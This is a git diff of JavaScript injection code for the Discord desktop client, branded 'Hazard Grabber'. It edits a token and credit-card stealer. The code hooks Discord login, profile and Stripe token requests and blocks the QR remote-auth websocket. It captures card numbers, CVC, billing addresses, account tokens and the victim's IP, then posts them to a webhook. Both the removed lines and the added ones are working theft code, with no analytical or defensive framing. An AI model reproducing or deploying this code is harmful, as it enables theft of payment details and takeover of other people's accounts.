@@ -55,29 +55,12 @@ const Filter = {
 	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
 }
 session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
-	if (details.url.startsWith("wss://")) {
-			callback({
-				cancel: true
-			})
-			return;
-	}
 	if (FirstTime()) {}
 
 	callback({})
 	return;
 })
-session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
-    if (FirstTime())
-        if (details.url.startsWith("wss://")) {
-            callback({
-                cancel: !0
-            })
-        } else {
-            callback({
-                cancel: !1
-            })
-        }
-})
+
 function SendToWebhook(what) {
 	const window = BrowserWindow.getAllWindows()[0];
 	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
@@ -284,8 +267,12 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
             var json = JSON.parse(info);
             var params = {
+                username: "Hazard Grabber",
+                content: "",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
+                        "color": 16507654,
                         "fields": [
                             {
                                 "name": "**Credit Card Added**",
@@ -307,6 +294,9 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "name": json.username + "#" + json.discriminator + "・" + json.id,
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
+                        "footer": {
+                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        }
                     }
                 ]
             }
@@ -314,52 +304,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
         })
     })
 }
-function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
-	const window = BrowserWindow.getAllWindows()[0];
-	window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );
-    xmlHttp.responseText;`, !0).then((info) => {
-		window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
-			var json = JSON.parse(info);
-            var params = {
-                embeds: [
-                    {
-                        "fields": [
-                            {
-                                "name": "**Credit Card Added**",
-                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
-                                "inline": true
-                            },
-                            {
-                                "name": "**Other Info**",
-                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
-                                "inline": true
-                            },
-                            {
-                                "name": "**Token**",
-                                "value": `\`${token}\``,
-                                "inline": false
-                            }
-                        ],
-                        "author": {
-                            "name": json.username + "#" + json.discriminator + "・" + json.id,
-                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                        },
-                    }
-                ]
-            }
-			SendToWebhook(JSON.stringify(params))
-		})
-	})
-}
+
 const ChangePasswordFilter = {
 	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
 };
